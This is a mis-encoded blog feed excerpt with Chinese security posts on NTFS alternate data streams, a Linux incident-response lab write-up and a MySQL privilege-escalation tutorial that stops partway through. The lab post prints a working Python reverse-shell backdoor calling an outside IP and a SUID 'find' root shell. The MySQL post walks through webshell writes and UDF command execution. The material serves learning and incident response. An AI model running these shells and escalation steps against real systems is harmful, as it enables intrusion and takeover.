ä¸€ä¸ªfaviconæ•°æ®æµä»¥å­˜æ”¾ç½‘ç«™å›¾æ ‡ã€‚</p><p>ADSä¹Ÿè¢«ç”¨äºä¸€äº›æ¶æ„æ–‡ä»¶éšè—è‡ªèº«,ä½œä¸ºåé—¨ã€‚</p><h1 id="adsåº”ç”¨"><a href="#ADSåº”ç”¨" class="headerlink" title="ADSåº”ç”¨"></a>ADSåº”ç”¨</h1><p>è¿™é‡Œå†™ä¸€ä¸ªéšè—æ–‡æœ¬æ¥çœ‹çœ‹ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªç©ºçš„example.txtï¼Œç„¶åå†™å…¥ADSï¼Œè¿™é‡Œå†™å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;123&quot;</span> &gt; example.txt:config <span class="hljs-comment">#è¿™é‡Œè¦ç”¨cmdï¼Œç”¨powershellä¼šæŠ¥é”™</span><br></code></pre></td></tr></table></figure><p>ç„¶åç›´æ¥æ‰“å¼€æ–‡ä»¶è¿˜æ˜¯ç©ºçš„</p><p><img src="http://cdn.clown2024.cn/202407151442538.png" alt="image-20240713015237491"></p><p>æƒ³è¦æŸ¥çœ‹ADSçš„è¯å¯ä»¥è¿™æ ·</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">notepad example.txt:config<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151442539.png" alt="image-20240713015437701"></p><p>è¿˜æœ‰ç”¨ä¸‹é¢å‘½ä»¤æŸ¥çœ‹è¯¥æ–‡ä»¶æ‰€æœ‰çš„ADS</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> example.txt /R<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151442540.png" alt="image-20240713015550479"></p><p>ADSå¯ä»¥å†™ä»»ä½•ä¸œè¥¿ï¼ŒåŒ…æ‹¬å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ç­‰ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¥éšè—åé—¨ï¼Œåœ¨Windows XPä¸­ï¼Œå¯æ‰§è¡Œæ–‡ä»¶å¯ä»¥éšè—å¹¶ä¸”è¢«æ‰§è¡Œã€‚ä½†æ˜¯ï¼Œå¾®è½¯å·²ç»å‘ç°äº†è¿™ä¸ªé—®é¢˜å¹¶è¿›è¡Œäº†ä¿®å¤ï¼Œç›®å‰åœ¨Windows VistaåŠåç»­ç³»ç»Ÿä¸­å·²ç»æ— æ³•ç›´æ¥è¿è¡ŒADSä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶äº†ã€‚</p><p>å¯ä»¥ç›´æ¥è¿™æ ·å†™å…¥æ–‡ä»¶ï¼Œå…¶ä»–æ–‡ä»¶åŒç†</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">type</span> <span class="hljs-number">01</span>.txt &gt; example.txt:<span class="hljs-number">01</span>.txt<br><span class="hljs-built_in">type</span> <span class="hljs-number">01</span>.txt &gt;&gt; example.txt:<span class="hljs-number">01</span>.txt<br></code></pre></td></tr></table></figure><p>ADSæ•°æ®æµæ–‡ä»¶æœ‰ä¸‰ç§åˆ é™¤æ–¹å¼ã€‚ä¸€æ˜¯ç›´æ¥<strong>åˆ é™¤å®¿ä¸»</strong>æ–‡ä»¶ï¼ŒäºŒæ˜¯å°†å®¿ä¸»æ–‡ä»¶<strong>ç§»åˆ°</strong>FAT32<strong>ç­‰é</strong>NTFS<strong>åˆ†åŒºä¸­</strong>ï¼›ä¸‰æ˜¯åˆ©ç”¨<strong>å·¥å…·è½¯ä»¶</strong>ï¼Œå¦‚IceSwordã€Ntfs Streams Editoråˆ é™¤ã€‚</p><p>Ntfs Streams Editoråˆ é™¤å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">streams.exe -d &lt;File&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™æ˜¯åœ¨å‰æ–‡å­¦ä¹ mysqlææƒçš„æ—¶å€™é‡åˆ°çš„åˆ©ç”¨æ•°æ®æµå†™æ–‡ä»¶ï¼Œä»¥å‰æœ‰ç‚¹å°è±¡ä½†ä¸æ˜¯å¾ˆæ·±ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;h1 id=&quot;ntfsæ•°æ®æµä»‹ç»&quot;&gt;&lt;a href=&quot;#NTFSæ•°æ®æµä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;NTFSæ•°æ®æµä»‹ç»&quot;&gt;&lt;/a&gt;NTF</summary>
      
    
    
    
    <category term="æ‚ä¸ƒæ‚å…«" scheme="https://clowsman.github.io/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
    <category term="æ‚ä¸ƒæ‚å…«" scheme="https://clowsman.github.io/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
  </entry>
  
  <entry>
    <title>ç„æœºåº”æ€¥å“åº”é¶åœº-ç¬¬ä¸‰ç« </title>
    <link href="https://clowsman.github.io/2024/07/12/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/"/>
    <id>https://clowsman.github.io/2024/07/12/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/</id>
    <published>2024-07-12T07:53:07.000Z</published>
    <updated>2024-07-15T06:53:06.252Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linuxæƒé™ç»´æŒ"><a href="#Linuxæƒé™ç»´æŒ" class="headerlink" title="Linuxæƒé™ç»´æŒ"></a>Linuxæƒé™ç»´æŒ</h1><p>é¶æœºç®€ä»‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ssh root@env.xj.edisec.net -p  å¯†ç   xjqxwcyc<br>1.é»‘å®¢éšè—çš„éšè—çš„æ–‡ä»¶ å®Œæ•´è·¯å¾„md5<br>2.é»‘å®¢éšè—çš„æ–‡ä»¶åå¼¹shellçš„ip+ç«¯å£ &#123;ip:port&#125;<br>3.é»‘å®¢ææƒæ‰€ç”¨çš„å‘½ä»¤ å®Œæ•´è·¯å¾„çš„md5 flag&#123;md5&#125; <br>4.é»‘å®¢å°è¯•æ³¨å…¥æ¶æ„ä»£ç çš„å·¥å…·å®Œæ•´è·¯å¾„md5<br>5.ä½¿ç”¨å‘½ä»¤è¿è¡Œ ./x.xx æ‰§è¡Œè¯¥æ–‡ä»¶  å°†æŸ¥è¯¢çš„ Exec****** å€¼ ä½œä¸ºflagæäº¤ flag&#123;/xxx/xxx/xxx&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçœ‹äº†ä¸€ä¸‹webç›®å½•æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œç›´æ¥ç”¨Dç›¾å…¨ç›˜æŸ¥æ€ä¸€ä¸‹</p><blockquote><p>è¿™é‡ŒæŒ‚è½½è¦æŒ‡å®šç«¯å£ï¼ŒæŒ‡å®šç«¯å£çš„å½¢å¼æ˜¯è¿™æ ·çš„ï¼š\sshfs.r\username@remote_ip!port\</p></blockquote><p>emmmä½†æ˜¯å¡ä½äº†æ‰«ä¸å‡ºæ¥ä¸œè¥¿</p><p><img src="http://cdn.clown2024.cn/202407151452447.png" alt="image-20240712163333073"></p><p>æœ€åæ˜¯åœ¨&#x2F;tmpç›®å½•ä¸‹å‘ç°äº†ä¸€ä¸ªéšè—æ–‡ä»¶ï¼Œé‡Œé¢æœ‰pythonè„šæœ¬&#x2F;tmp&#x2F;.temp&#x2F;libprocesshider&#x2F;1.py</p><p><img src="http://cdn.clown2024.cn/202407151452448.png" alt="image-20240712162238473"></p><p>flag{109ccb5768c70638e24fb46ee7957e37}</p><p>å…¶è„šæœ¬å†…å®¹</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> socket,subprocess,os,sys, time<br><br>pidrg = os.fork()<br><span class="hljs-keyword">if</span> pidrg &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br>os.chdir(<span class="hljs-string">&quot;/&quot;</span>)<br>os.setsid()<br>os.umask(<span class="hljs-number">0</span>)<br>drgpid = os.fork()<br><span class="hljs-keyword">if</span> drgpid &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">try</span>:<br>                sys.stdout.flush()<br>                sys.stderr.flush()<br>                fdreg = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>                sys.stdout = fdreg<br>                sys.stderr = fdreg<br>                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>                sdregs.connect((<span class="hljs-string">&quot;114.114.114.121&quot;</span>,<span class="hljs-number">9999</span>))<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">0</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">1</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">2</span>)<br>                p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])<br>                sdregs.close()<br>        <span class="hljs-keyword">except</span> Exception:<br>                <span class="hljs-keyword">pass</span><br>        time.sleep(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>å…¶åå¼¹shellçš„ipå’Œç«¯å£å°±æ˜¯ä¸Šé¢ä»£ç ä¸­çš„</p><p>flag{114.114.114.121:9999}</p><blockquote><p>ä¸€å¼€å§‹æ‰¾åˆ°ä¸€ä¸ª1.shçš„è„šæœ¬ï¼Œé‡Œé¢æ˜¯ä¸€ä¸ªbashåå¼¹shellä½†æ˜¯é‚£ä¸ªç©æ„ä¸æ˜¯flagï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯ç¯å¢ƒæ²¡æ€ä¹ˆæ”¹ã€‚ã€‚ã€‚</p></blockquote><p>æŸ¥çœ‹é»‘å®¢çš„ææƒå‘½ä»¤ï¼Œå…ˆçœ‹&#x2F;etc&#x2F;passwd</p><p><img src="http://cdn.clown2024.cn/202407151452449.png" alt="image-20240712162658912"></p><p>æœ‰ä¸ªctfç”¨æˆ·ï¼Œåˆ‡æ¢åˆ°è¯¥ç”¨æˆ·æ‰§è¡Œä¸‹é¢å‘½ä»¤æ‰¾æ˜¯å¦èƒ½å¤Ÿsuidææƒ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452450.png" alt="image-20240712162931598"></p><p>å‘ç°findå‘½ä»¤å°±èƒ½ææƒ</p><p>å…¶ææƒå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/usr/bin/find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit<br></code></pre></td></tr></table></figure><p>flag{7fd5884f493f4aaf96abee286ee04120}</p><blockquote><p>emmmæ²¡æƒ³æ˜ç™½è¿™ä¸ªæ€è·¯æ˜¯æ€ä¹ˆæ¥çš„ï¼Œçœ‹åˆ«äººçš„wpï¼Œéš¾é“ææƒä¸€å®šæ˜¯suidå—ğŸ˜¥</p></blockquote><p>ç„¶åå°±æ˜¯æ‰¾æ³¨å…¥ä»£ç çš„æ¶æ„å·¥å…·ï¼Œè¿™é‡Œç”¨ä¸‹é¢è¿™ä¸ªå‘½ä»¤æŸ¥æ‰¾</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&#x27;.*&#x27;</span> 2&gt;/dev/null|grep -v <span class="hljs-string">&#x27;sys&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452451.png" alt="image-20240712164100081"></p><p>æœç´¢å¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€ä¸ªæ³¨å…¥å·¥å…·ï¼š<a href="https://cn-sec.com/archives/2563485.html">https://cn-sec.com/archives/2563485.html</a></p><blockquote><p>Cymothoaæ˜¯ä¸€æ¬¾éšç§˜çš„åé—¨å·¥å…·ï¼Œé€šè¿‡å‘ç›®æ ‡ä¸»æœºä¸Šæ´»è·ƒçš„è¿›ç¨‹æ³¨å…¥æ¶æ„ä»£ç æ¥æ‰§è¡Œåé—¨å·¥ä½œï¼Œè¿™ä¹Ÿåå‘è¯´æ˜äº†ï¼Œå®é™…ä¸ŠCymothoaåé—¨ä¼šæ‹¥æœ‰å’ŒåŸè¿›ç¨‹ç›¸åŒçš„æƒé™ï¼Œä¸”Cymothoaæ˜¯é€šè¿‡å‘ç³»ç»Ÿè¿›ç¨‹æ³¨å…¥shellcodeå»æ‰§è¡Œåé—¨ï¼Œæ‰€ä»¥ä¸ä¼šåƒä»¥å‰å†™è¿‡çš„è®¸å¤šåé—¨ä¸€æ ·åˆ›å»ºè‡ªå·±çš„è¿›ç¨‹ï¼Œè¿™ä½¿å¾—å®ƒçš„éšè”½æ€§æé«˜äº†å¾ˆå¤šã€‚</p></blockquote><p>æ‰€ä»¥å…¶å·¥å…·è·¯å¾„å¦‚ä¸‹ï¼š&#x2F;opt&#x2F;.cymothoa-1-beta&#x2F;cymothoa</p><p>flag{087c267368ece4fcf422ff733b51aed9}</p><p>æœ€åæ‰§è¡Œä¸€ä¸‹è¿™ä¸ª1.pyçš„è„šæœ¬æŸ¥è¯¢ä¸€ä¸‹ç½‘ç»œè¿æ¥</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python3 ./1.py<br>netstat -pantu<br><span class="hljs-built_in">cat</span> /proc/563/cmdline<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452452.png" alt="image-20240712165626986"></p><p>ç„¶åæ‰¾åˆ°ä¸€ä¸ªè½¯é“¾æ¥ï¼Œè¿™ä¸ªå°±æ˜¯flag(æ²¡æ‡‚è·Ÿé¢˜ç›®æè¿°çš„æ­¥éª¤æœ‰ä»€ä¹ˆå…³ç³»</p><p>flag{&#x2F;usr&#x2F;bin&#x2F;python3.4}</p><blockquote><p>è¯´å®è¯æ˜¯åœ¨æ²¡çœ‹æ‡‚è¿™é‡Œæ˜¯ä»€ä¹ˆæ„æ€ï¼Œçœ‹çš„åˆ«äººçš„wpï¼Œæœ‰ç‚¹æ„ä¹‰ä¸æ˜ã€‚ã€‚ã€‚</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;linuxæƒé™ç»´æŒ&quot;&gt;&lt;a href=&quot;#Linuxæƒé™ç»´æŒ&quot; class=&quot;headerlink&quot; title=&quot;Linuxæƒé™ç»´æŒ&quot;&gt;&lt;/a&gt;Linuxæƒé™ç»´æŒ&lt;/h1&gt;&lt;p&gt;é¶æœºç®€ä»‹&lt;/p&gt;
&lt;figure class=&quot;highlight plaintex</summary>
      
    
    
    
    <category term="åº”æ€¥å“åº”" scheme="https://clowsman.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="åº”æ€¥å“åº”" scheme="https://clowsman.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>mysqlææƒ</title>
    <link href="https://clowsman.github.io/2024/07/12/mysql%E6%8F%90%E6%9D%83/"/>
    <id>https://clowsman.github.io/2024/07/12/mysql%E6%8F%90%E6%9D%83/</id>
    <published>2024-07-11T17:22:48.000Z</published>
    <updated>2024-07-15T06:41:45.285Z</updated>
    
    <content type="html"><![CDATA[<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p><h1 id="æƒé™è·å–"><a href="#æƒé™è·å–" class="headerlink" title="æƒé™è·å–"></a>æƒé™è·å–</h1><p>è¦ææƒä¹‹å‰é¦–å…ˆå°±è¦æ‹¿åˆ°mysqlçš„æƒé™ï¼Œè¿™é‡Œå¤§ä½¬çš„æ–‡ç« å·²ç»è¯´çš„å¾ˆè¯¦ç»†äº†ï¼Œæˆ‘å°±è®°å½•ä¸€äº›å†™shellç›¸å…³çš„çŸ¥è¯†</p><p><strong>into outfileå†™shell</strong></p><p>éœ€è¦load_file () å¼€å¯ å³ secure_file_priv æ— é™åˆ¶</p><p>å¯ä»¥é€šè¿‡ä¸‹é¢å‘½ä»¤æŸ¥çœ‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">show global variables like <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br></code></pre></td></tr></table></figure><table><thead><tr><th>Value</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>NULL</td><td>ä¸å…è®¸å¯¼å…¥æˆ–å¯¼å‡º</td></tr><tr><td>&#x2F;tmp</td><td>åªå…è®¸åœ¨ &#x2F;tmp ç›®å½•å¯¼å…¥å¯¼å‡º</td></tr><tr><td>ç©º</td><td>ä¸é™åˆ¶ç›®å½•</td></tr></tbody></table><blockquote><p>åœ¨ MySQL 5.5 ä¹‹å‰ secure_file_priv é»˜è®¤æ˜¯ç©ºï¼Œè¿™ä¸ªæƒ…å†µä¸‹å¯ä»¥å‘ä»»æ„ç»å¯¹è·¯å¾„å†™æ–‡ä»¶</p><p>åœ¨ MySQL 5.5 ä¹‹å secure_file_priv é»˜è®¤æ˜¯ NULLï¼Œè¿™ä¸ªæƒ…å†µä¸‹ä¸å¯ä»¥å†™æ–‡ä»¶</p></blockquote><p><strong>æ—¥å¿—å†™shell</strong></p><p>å¯ä»¥ä¸‹é¢å‘½ä»¤æŸ¥çœ‹æ—¥å¿—ä½ç½®</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span>;<br><br>+------------------+---------------------------------+<br>| Variable_name    | Value                           |<br>+------------------+---------------------------------+<br>| general_log      | OFF                             |<br>| general_log_file | /var/lib/mysql/c1595d3a029a.<span class="hljs-built_in">log</span> |<br>+------------------+---------------------------------+<br></code></pre></td></tr></table></figure><p><code>general_log</code> é»˜è®¤å…³é—­ï¼Œå¼€å¯å®ƒå¯ä»¥è®°å½•ç”¨æˆ·è¾“å…¥çš„æ¯æ¡å‘½ä»¤ï¼Œä¼šæŠŠå…¶ä¿å­˜åœ¨å¯¹åº”çš„æ—¥å¿—æ–‡ä»¶ä¸­ã€‚</p><p>æˆ‘ä»¬å¯ä»¥è‡ªå·±ä¿®æ”¹æ—¥å¿—æ–‡ä»¶ä½ç½®ï¼Œè¿™æ ·å°±å¯ä»¥å†™shellè¿›å»äº†</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ›´æ”¹æ—¥å¿—æ–‡ä»¶ä½ç½®</span><br><span class="hljs-built_in">set</span> global general_log = <span class="hljs-string">&quot;ON&quot;</span>;<br><span class="hljs-built_in">set</span> global general_log_file=<span class="hljs-string">&#x27;/var/www/html/info.php&#x27;</span>;<br></code></pre></td></tr></table></figure><h1 id="udfææƒ"><a href="#udfææƒ" class="headerlink" title="udfææƒ"></a>udfææƒ</h1><p>è‡ªå®šä¹‰å‡½æ•°(user defined function)ï¼Œæ˜¯æ•°æ®åº“åŠŸèƒ½çš„ä¸€ç§æ‰©å±•ã€‚ç”¨æˆ·é€šè¿‡è‡ªå®šä¹‰å‡½æ•°å¯ä»¥å®ç°åœ¨ MySQL ä¸­æ— æ³•æ–¹ä¾¿å®ç°çš„åŠŸèƒ½ï¼Œå…¶æ·»åŠ çš„æ–°å‡½æ•°éƒ½å¯ä»¥åœ¨ SQL è¯­å¥ä¸­è°ƒç”¨ï¼Œå°±åƒè°ƒç”¨æœ¬æœºå‡½æ•° version () ç­‰æ–¹ä¾¿ã€‚</p><h2 id="æ‰‹å·¥å¤ç°"><a href="#æ‰‹å·¥å¤ç°" class="headerlink" title="æ‰‹å·¥å¤ç°"></a>æ‰‹å·¥å¤ç°</h2><p><strong>åŠ¨æ€é“¾æ¥åº“</strong></p><p>è‡ªå®šä¹‰å‡½æ•°æ˜¯æ˜¯ä½¿ç”¨åŠ¨æ€é“¾æ¥åº“çš„å½¢å¼å®ç°çš„ï¼Œå¦‚æœæ˜¯ MySQL &gt;&#x3D; 5.1 çš„ç‰ˆæœ¬ï¼Œå¿…é¡»æŠŠ UDF çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶æ”¾ç½®äº MySQL å®‰è£…ç›®å½•ä¸‹çš„ lib\plugin æ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶å¤¹ä¸‹æ‰èƒ½åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°ã€‚</p><p>åŠ¨æ€é“¾æ¥åº“çš„æ–‡ä»¶å¯ä»¥å»sqlmapå’Œmetasploitå·¥å…·é‡Œé¢å»æ‰¾</p><p><strong>sqlmapçš„udfæ–‡ä»¶ä½ç½®</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sqlmapæ ¹ç›®å½•/data/udf/mysql<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441364.png" alt="image-20240712174152824"></p><p>é‡Œé¢æœ‰windowså’ŒLinuxçš„32ä½å’Œ64ä½çš„åŠ¨æ€é“¾æ¥åº“</p><p>ä¸è¿‡sqlmapé‡Œçš„åŠ¨æ€é“¾æ¥åº“ä¸ºäº†é˜²æ­¢è¯¯æ€ç»è¿‡ç¼–ç å¤„ç†ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œä¸è¿‡å¯ä»¥åˆ©ç”¨sqlmapè‡ªå¸¦çš„è§£ç å·¥å…·æ¥è¿›è¡Œè§£ç ä½¿ç”¨ï¼Œå·¥å…·åœ¨&#x2F;extra&#x2F;cloak&#x2F;cloak.py</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è§£ç  32 ä½çš„ Linux åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><br><span class="hljs-comment"># è§£ç  64 ä½çš„ Linux åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><br><span class="hljs-comment"># è§£ç  32 ä½çš„ Windows åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><br><span class="hljs-comment"># è§£ç  64 ä½çš„ Windows åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure><p><strong>Metasploitçš„udfæ–‡ä»¶ä½ç½®</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">MSFæ ¹ç›®å½•/data/exploits/mysql<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441365.png" alt="image-20240713012640874"></p><p>msfè‡ªå¸¦çš„åŠ¨æ€é“¾æ¥åº“ä¸éœ€è¦è§£ç å¯ä»¥ç›´æ¥ä½¿ç”¨</p><blockquote><p>kalié‡Œé¢msfçš„æ ¹ç›®å½•åœ¨&#x2F;usr&#x2F;share&#x2F;metasploit-framework</p></blockquote><p><strong>ä¸‹ä¸€æ­¥å°±æ˜¯å°†é“¾æ¥åº“æ”¾åˆ°æ’ä»¶ç›®å½•ä¸‹</strong></p><p>å¯ä»¥ç”¨ä¸‹é¢å‘½ä»¤æŸ¥æ‰¾æ’ä»¶ç›®å½•</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">show variables like <span class="hljs-string">&quot;%plugin%&quot;</span><br><span class="hljs-comment">#è¿™æ ·ä¹Ÿè¡Œ</span><br><span class="hljs-keyword">select</span> @@plugin_dir;<br></code></pre></td></tr></table></figure><p>å¦‚æœä¸å­˜åœ¨çš„è¯å¯ä»¥æ‰¾åˆ° MySQL çš„å®‰è£…ç›®å½•ç„¶åæ‰‹å·¥åˆ›å»º <code>\lib\plugin</code> æ–‡ä»¶å¤¹</p><p>æ‰¾mysqlçš„å®‰è£…ç›®å½•å¯ä»¥ç”¨è¿™ä¸ªå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> @@basedir;<br></code></pre></td></tr></table></figure><p><strong>å†™å…¥åŠ¨æ€é“¾æ¥åº“</strong></p><p>sqlæ³¨å…¥æ˜¯postæ³¨å…¥å¯ä»¥ç›´æ¥å†™ï¼Œå› ä¸ºgetæœ‰é•¿åº¦é™åˆ¶ï¼Œè¿™é‡Œå¯ä»¥ç”¨sqlmapæ¥å†™</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sqlmap -u &lt;urlåœ°å€&gt; --data=<span class="hljs-string">&quot;id=1&quot;</span> --file-write=<span class="hljs-string">&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest=<span class="hljs-string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç›´æ¥æ‰‹å·¥ç”¨sqlè¯­å¥å†™è¿›å»ï¼Œè¿™äº›å‰æéƒ½æ˜¯æœ‰å†™æƒé™</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ç›´æ¥ SELECT æŸ¥è¯¢åå…­è¿›åˆ¶å†™å…¥</span><br>SELECT 0x7f454c4602... INTO OUTFILE <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;<br></code></pre></td></tr></table></figure><p>åå…­è¿›åˆ¶çš„è·å–å¯ä»¥ç›´æ¥æœ¬åœ°ç”¨mysqlçš„hexå‡½æ•°ç¼–ç ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ç›´æ¥ä¼ å…¥è·¯å¾„ç¼–ç </span><br>SELECT hex(load_file(<span class="hljs-string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>));<br><br><span class="hljs-comment"># ä¹Ÿå¯ä»¥å°†è·¯å¾„ hex ç¼–ç </span><br>SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f));<br></code></pre></td></tr></table></figure><p><strong>ç„¶åå°±æ˜¯åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> STRING SONAME <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br>#æŸ¥çœ‹æ˜¯å¦æ–°å¢äº†sys_eval<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func;<br>#ç„¶åå°±å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>#åˆ é™¤è‡ªå®šä¹‰å‡½æ•°<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval;<br></code></pre></td></tr></table></figure><blockquote><p>å¦‚æœæƒ³çœ‹soæ–‡ä»¶é‡Œé¢æœ‰å“ªäº›å‡½æ•°ï¼Œå¯ä»¥æ‹–è¿›idaé‡Œé¢çœ‹ä¸€çœ‹</p></blockquote><h1 id="mofææƒ"><a href="#mofææƒ" class="headerlink" title="mofææƒ"></a>mofææƒ</h1><p>è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒè€çš„æ¼æ´äº†ï¼ŒåŸºæœ¬ä¸Šåœ¨ Windows Server 2003 çš„ç¯å¢ƒä¸‹æ‰å¯ä»¥æˆåŠŸã€‚</p><p>ææƒçš„åŸç†æ˜¯ C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; ç›®å½•ä¸‹çš„ mof æ–‡ä»¶æ¯ éš”ä¸€æ®µæ—¶é—´ï¼ˆå‡ ç§’é’Ÿå·¦å³ï¼‰éƒ½ä¼šè¢«ç³»ç»Ÿæ‰§è¡Œï¼Œå› ä¸ºè¿™ä¸ª MOF é‡Œé¢æœ‰ä¸€éƒ¨åˆ†æ˜¯ VBS è„šæœ¬ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ª VBS è„šæœ¬æ¥è°ƒç”¨ CMD æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚æœ MySQL 